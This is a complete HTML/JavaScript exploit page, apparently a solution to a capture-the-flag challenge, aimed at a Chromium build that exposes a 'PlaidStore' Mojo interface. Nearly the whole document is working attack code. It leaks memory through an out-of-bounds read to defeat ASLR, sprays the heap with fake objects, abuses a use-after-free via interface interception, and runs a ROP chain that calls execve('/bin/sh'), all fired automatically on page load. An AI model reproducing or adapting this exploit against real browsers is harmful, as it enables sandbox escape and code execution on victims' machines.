<!DOCTYPE html>
<html>
    <script src="/mojo_js_extracted/mojo/public/js/mojo_bindings.js"></script>
    <script src="/mojo_js_extracted/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>

    <!-- 1. we can read arbitraty length from our 'data_store_' (std::vector<uint8_t>) -->
    <!-- 2. uaf due to 'MakeSelfOwnedReciever' - we can still queue messages on the pipe, we can intercept the request using 
            MojoJSTest and free it immediately -->
    <head>
        <script>
            console.log('asdf');
        </script>

        <script>
            /*
            rdi = PlaidStoreImpl
            [rdi] = vtable
            [rdi + 8] = render frame host

            [rax + 160] = IsRenderFrameAlive()
            */

            const kSprayPlaidStoreAmount = 0x1000;
            const kSprayRFHAmount = 500;

            const kPlaidStoreImplSize = 0x28;
            const kRenderFrameHostImplSize = 0xc28;
        </script>

        <script>
            const print = (str) => {
                console.log(str);

                const element = document.getElementById('logger');

                if (element) {
                    element.innerText += str + '\n';
                }
            }

            const create_rfh = () => {
                const iframe = document.createElement('iframe');
                iframe.src = document.location.href + '#qwerty';
                iframe.id = 'qwerty';

                document.body.appendChild(iframe);
            }

            const delete_rfh = () => {
                print('deleting rfh');
                document.getElementById('qwerty').remove();
            }

            const interfaceName = 'yuvaly0';

            const spray_rfh = (buffer) => {
                const plaid_store_ptr = new blink.mojom.PlaidStorePtr();
                    Mojo.bindInterface(blink.mojom.PlaidStore.name, 
                mojo.makeRequest(plaid_store_ptr).handle, 'context', true);

                /*
                    when we call storeData on a plaidStore object it will create an equal size vector, meaning we have arbitrary allocation size, we can use it for spraying in the size of the renderFrameHost object
                */
                for(let i = 0; i < kSprayRFHAmount; i++) {
                    plaid_store_ptr.storeData(`yuvaly${i}`, buffer);
                }
            }

            const setup_intercept = () => {
                const pipe = Mojo.createMessagePipe();
                Mojo.bindInterface(blink.mojom.PlaidStore.name, pipe.handle1, "context", true);
                Mojo.bindInterface(interfaceName, pipe.handle0, "process");
            }

            const spray_plaid_store = async (handle) => {
                const provider = new blink.mojom.PlaidStorePtr(handle);
                
                const plaid_store_like = new Uint8Array(kPlaidStoreImplSize);
                plaid_store_like.fill(0x41);

                for (let i = 0; i < kSprayPlaidStoreAmount; i++) {
                    provider.storeData('wello' + i, plaid_store_like);
                }

                return provider;
            }

            const get_ropchain = (chrome_base, rfh_address) => {
                /*
                    mov    rax,QWORD PTR [rdi]
                    call   QWORD PTR [rax+0x160]
                    
                    - I control content of rdi
                    - content of freed object -
                    - [rdi] = rfh_address
                    - rax = [rdi]

                    2. rax = [rdi] -> rdi + 0x10
                    3. call rax + 0x160

                    pop rdi(address of /bin/sh), pop rsi(null), pop rdx(null), pop rax(59), syscall

                    0x880dee8 : xchg rax, rsp ; clc ; pop rbp ; ret
                    0x2e4630f : pop rdi ; ret
                    0x2d278d2 : pop rsi ; ret
                    0x2e9998e : pop rdx ; ret
                    0x2e651dd : pop rax ; ret
                    0x2ef528d : syscall


                    0x0  -   rfh_address + 0x10 -> 0x10
                    0x8  -    
                    0x10 -   rax -> rsp
                    0x18 -
                    0x20 -
                    0x160 + 0x10 - xchg rax, rsp, ret
                */

                const rop_offsets = {
                    xchg_rax_rsp: 0x880dee8n,
                    pop_rdi: 0x2e4630fn,
                    pop_rsi: 0x2d278d2n,
                    pop_rdx: 0x2e9998en,
                    pop_rax: 0x2e651ddn,
                    syscall: 0x2ef528dn
                };

                const gadgets = {
                    xchg_rax_rsp: chrome_base + rop_offsets['xchg_rax_rsp'],
                    pop_rdi: chrome_base + rop_offsets['pop_rdi'],
                    pop_rsi: chrome_base + rop_offsets['pop_rsi'],
                    pop_rdx: chrome_base + rop_offsets['pop_rdx'],
                    pop_rax: chrome_base + rop_offsets['pop_rax'],
                    syscall: chrome_base + rop_offsets['syscall']
                };

                print('xchg rax rsp: 0x' + gadgets['xchg_rax_rsp'].toString(16));
                print('pop rdi: 0x' + gadgets['pop_rdi'].toString(16));
                print('pop rsi: 0x' + gadgets['pop_rsi'].toString(16));
                print('pop rdx: 0x' + gadgets['pop_rdx'].toString(16));
                print('pop rax: 0x' + gadgets['pop_rax'].toString(16));
                print('syscall: 0x' + gadgets['syscall'].toString(16));

                const buffer = new ArrayBuffer(kRenderFrameHostImplSize);
                const array = new BigUint64Array(buffer);
                const ropchain = new Uint8Array(buffer);
                ropchain.fill(0x23);

                array[0] = rfh_address + 0x10n; // rax = [rdi]

                array[46] = gadgets['xchg_rax_rsp']; //  xchg rax, rsp ; clc ; pop rbp ; ret
                array[2] = 0x10n; // pop rbp ^
                array[3] = gadgets['pop_rdi']; // ret ^^
                array[4] = rfh_address + 0x60n; // address of binsh
                array[5] = gadgets['pop_rsi'];
                array[6] = 0x0n;
                array[7] = gadgets['pop_rdx'];
                array[8] = 0x0n;
                array[9] = gadgets['pop_rax'];
                array[10] = 59n;
                array[11] = gadgets['syscall'];
                array[12] = 0x0068732f6e69622fn;

                
                return ropchain;
            }

            const replace_free_object = () => {
                const frame = create_rfh();
                const interceptor = new MojoInterfaceInterceptor(interfaceName, "process");

                interceptor.oninterfacerequest = async (e) => {
                    print('[+] intercepted');
                    interceptor.stop();

                    // spray 500 plaid store objects
                    // leak the 'provider' vtable and rfh
                    const provider = await spray_plaid_store(e.handle);

                    const response = await get_base(provider);

                    if(!response) {
                        location.reload();
                    }

                    const {chrome_base, rfh_address} = response;
                    const ropchain = get_ropchain(chrome_base, rfh_address);

                    delete_rfh();

                    spray_rfh(ropchain);

                    setTimeout(() => {
                        print('[+] gonna trigger');

                        provider.storeData('1', new Uint8Array(3));

                        print('[+] got shell?');
                    }, 500);
                }

                interceptor.start(); 
            }
        </script>

        <script>
            /*
                we know the relative vtable before loading the binary to the memory
                is 0x9fb67a0 - because the aslr-randomization is at the page level we know
                that even when we'll load it it will end with '7a0',
                now we can search for an address in the leak that starts with 
                0x00005 and ends with '7a0' and subtract the diff we know (the vtable relative offest) in order to calculate the binary base
            */
            const get_base = async (object) => {

                for (let i = 0; i < kSprayPlaidStoreAmount; i++) {
                    const {data} = await object.getData('wello' + i, 0x120);
                    const t_array = new Uint8Array(data);
                    const array = new BigUint64Array(t_array.buffer);

                    for (let j = 5; j < array.length; j++) {
                        const address = array[j].toString(16);

                        if (address.startsWith('5') && address.endsWith('7a0')) {
                            const vtable_address = array[j];
                            const rfh_address = array[j+1];

                            const chrome_base = vtable_address - 0x9fb67a0n;
                            print('[+] rfh address: 0x' + rfh_address.toString(16));
                            print('[+] vtable address: 0x' + vtable_address.toString(16));
                            print('[+] chrome_base: 0x' + chrome_base.toString(16));

                            return {
                                chrome_base,
                                rfh_address
                            }
                        }
                    }
                }

                print('[-] failed to leak, run again');

                return null;
            }

            const exploit = async () => {
                if (document.location.href.includes('qwerty')) {
                    setup_intercept();
                } else {
                    replace_free_object();
                }
            }
        </script>
    </head>
    <body onload="exploit()">
        <span id="logger"></span>
    </body>
</html>